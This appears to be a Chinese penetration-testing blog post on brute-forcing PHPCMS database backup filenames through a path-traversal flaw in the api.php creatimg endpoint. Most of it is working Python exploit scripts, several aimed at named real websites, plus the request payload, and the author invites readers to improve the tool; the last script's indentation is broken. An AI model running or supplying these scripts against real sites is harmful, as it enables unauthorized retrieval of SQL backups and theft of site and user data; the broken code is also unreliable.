---
title: PHPCMS SQL备份文件名猜解爆破验证
date: 2019-05-06 16:05:53
tags: 实战经验
categories: 渗透测试
---
## PHPCMS SQL备份文件名爆破验证概述
&#160; &#160; &#160; &#160;昨天在翻网站的时候，看见一个网站CMS是phpcms的，以前有过前台getshell的经验，就准备直接前台getshell，但是后来发现不能够注册，没法了。但是这种搞了半天让我放弃又不想，所以就百度了一波phpcms的漏洞，然后再I春秋看见了一个帖子，这位作者大概整理了一下phpcms的漏洞，其中我看见了一个PHPCMS SQL备份文件名爆破的逻辑漏洞，就按部就班的去搞了，结果在这实际搞的过程中发现了问题。
<!--more-->
## 问题一：脚本问题
&#160; &#160; &#160; &#160;先分享一下这位作者的源代码：
```
#!/usr/bin/env python
# coding=utf-8
'''/*
    * author = Mochazz
    * team   = 红日安全团队
    * env    = pyton3
    *
    */
'''
import requests
import itertools
characters = "abcdefghjklmnopqrstuvwxyz0123456789_!#"
backup_sql = ""
payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
url = "http://192.168.0.106"
flag = 0
for num in range(1,7):
    if flag:
        break
    for pre in itertools.permutations(characters,num):
        pre = ''.join(list(pre))
        payload = payload.format(location=pre)
        r = requests.get(url+payload)
        if r.status_code == 200 and "PNG" in r.text:
            flag = 1
            backup_sql = pre
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
            break
        else:
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
print("[+] 前缀为：",backup_sql)
flag = 0
for i in range(30):
    if flag:
        break
    for ch in characters:
        if ch == characters[-1]:
            flag = 1
            break
        payload = payload.format(location=backup_sql+ch)
        r = requests.get(url + payload)
        if r.status_code == 200 and "PNG" in r.text:
            backup_sql += ch
            print("[+] ",backup_sql)
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
            break
        else:
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

print("备份sql文件地址为：",backup_sql+".sql")
```
&#160; &#160; &#160; &#160;乍一看没啥大的问题，但是我在实际测试的时候发现了一个问题，因为这个文件名，不一定都是小写，有的可能是大写，虽然对于win系统中大小写无差别，但是当python在爆破文件名的时候，因为字典没定义大写，可能遇到是大写的字母就直接程序运行结束，一开始我就是遇到这个问题了，所以不管怎么跑，跑出来的备份数据库名不对。后来我优化了一下代码如下：
```
# coding=utf-8
import requests
import itertools
characters = "abcdefghjklmnopqrstuvwxyz0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ_.-"
backup_sql = ""
payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
url = "http://www.cqmxnt.com"
flag = 0
for num in range(1,7):
    if flag:
        break
    for pre in itertools.permutations(characters,num):
        pre = ''.join(list(pre))
        payload = payload.format(location=pre)
        r = requests.get(url+payload)
        if r.status_code == 200 and "PNG" in r.text:
            flag = 1
            backup_sql = pre
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
            break
        else:
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
print("[+] 前缀为：",backup_sql)
flag = 0
for i in range(30):
    if flag:
        break
    for ch in characters:
        if ch == characters[-1]:
            flag = 1
            break
        payload = payload.format(location=backup_sql+ch)
        r = requests.get(url + payload)
        if r.status_code == 200 and "PNG" in r.text:
            backup_sql += ch
            print("[+] ",backup_sql)
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
            break
        else:
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

print("备份sql文件地址为：",backup_sql+".sql")
```
&#160; &#160; &#160; &#160;嗯，这下看起来应该没问题，接着又跑了一下，问题特么又来了，循环次数不够，没跑完就结束了！因为一开始没搭建本地环境也不知道备份数据库文件名有多少，就往大了猜，就把循环设置为了100，这下子应该是没毛病了。完整代码如下：
```
# coding=utf-8
import requests
import itertools
characters = "abcdefghjklmnopqrstuvwxyz0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ_.-"
backup_sql = ""
payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
url = "http://www.cqmxnt.com"
flag = 0
for num in range(1,7):
    if flag:
        break
    for pre in itertools.permutations(characters,num):
        pre = ''.join(list(pre))
        payload = payload.format(location=pre)
        r = requests.get(url+payload)
        if r.status_code == 200 and "PNG" in r.text:
            flag = 1
            backup_sql = pre
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
            break
        else:
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
print("[+] 前缀为：",backup_sql)
flag = 0
for i in range(100):
    if flag:
        break
    for ch in characters:
        if ch == characters[-1]:
            flag = 1
            break
        payload = payload.format(location=backup_sql+ch)
        r = requests.get(url + payload)
        if r.status_code == 200 and "PNG" in r.text:
            backup_sql += ch
            print("[+] ",backup_sql)
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
            break
        else:
            payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

print("备份sql文件地址为：",backup_sql+".sql")
```
&#160; &#160; &#160; &#160;这次倒是跑出来了看起来比较完善的文件名了，但是问题又来了，我怎么知道路径呢？这个备份文件到哪儿去找？一开始我也仅仅是看懂了这个代码的意思，没太理解这个payload，就一直在纠结这个问题。
## 问题二：路径问题
&#160; &#160; &#160; &#160;昨天研究了一天，没啥思路，今天就决定亲自操刀，自己本地搭建一个phpcms的测试环境来试试。嘿，还别说，真的就出来了其实路径就是在/caches/bakup/default/这里面，备份数据库文件的路径就是这里面，于是就去测试了一波本地环境的，测试结果如图所示：
[![EDATPK.md.png](https://s2.ax1x.com/2019/05/06/EDATPK.md.png)](https://imgchr.com/i/EDATPK)
[![EDAH2D.md.png](https://s2.ax1x.com/2019/05/06/EDAH2D.md.png)](https://imgchr.com/i/EDAH2D)
[![EDAOrd.md.png](https://s2.ax1x.com/2019/05/06/EDAOrd.md.png)](https://imgchr.com/i/EDAOrd)
&#160; &#160; &#160; &#160;到这里基本就算是成功了，但是还是有几个小问题，那就是python脚本问题，亲自测试了几个站，有的站跑不起来，想了一下，应该是备份文件名有特殊字符的原因，因为脚本定义的字符里面没有满足要求的特殊字符，程序卡在哪儿一直循环，具体情况还在研究，希望哪位兄弟来接着完善一下这个脚本。
## payload
&#160; &#160; &#160; &#160;payload：/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/gv5dmx<<.sql，如果访问这个路径出现一个png图片，则证明漏洞存在。
## 总结
&#160; &#160; &#160; &#160;可能这些漏洞很早就爆出来了，但是自己不去亲自测试，你永远不知道其中有些啥问题，本次测试验证漏洞，就发现了很多问题，脚本问题，路径问题等等。可能有人发帖早，但是很多问题阐述的不是特别清楚。我在这里仅仅只是做了进一步的完善，也希望哪位兄弟能够进一步完善一下这个脚本，还存在问题，也希望完善了分享一下谢谢！哦，对了，我还看见一种python2写的脚本，可以参考一下，代码如下：
```
#coding=utf-8
import urllib2
def check(url):  
  mark = True  
  req = urllib2.Request(url)    
  req.add_header('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')    
  response = urllib2.urlopen(req)    
  content = response.read()    
  if 'Cannot' in content:        
      mark = False    
  return mark
  
def guest(target):    
    arr = []    
    num = map(chr, range(48, 58))    
    alpha = map(chr, range(97, 123))    
    exploit = '%s/api.php?
    op=creatimg&txt=dysec&font=/../../../../caches/bakup/default/%s%s<<.sql'
    
    while True:        
       for char in num:            
        if check(exploit % (target, ''.join(arr), char)):               
           arr.append(char)                
           continue        
           
        if len(arr) < 20:            
            for char in alpha:                 
                 if check(exploit % (target, ''.join(arr), char)):                    
                     arr.append(char)                    
                     continue        
                
        elif len(arr) == 20:            
              arr.append('_db_')        
              
        elif len(arr)== 29:            
              arr.append('_1.sql')            
              break        
              
        if len(arr) < 1:            
            print '[*]not find!'            
            return    
            
        print '[*]find: %s/caches/bakup/default/%s' % (target, ''.join(arr))
        
    if __name__ == "__main__":    
        url = 'http://security.douyu.com'    
        #test    
        guest(url)
```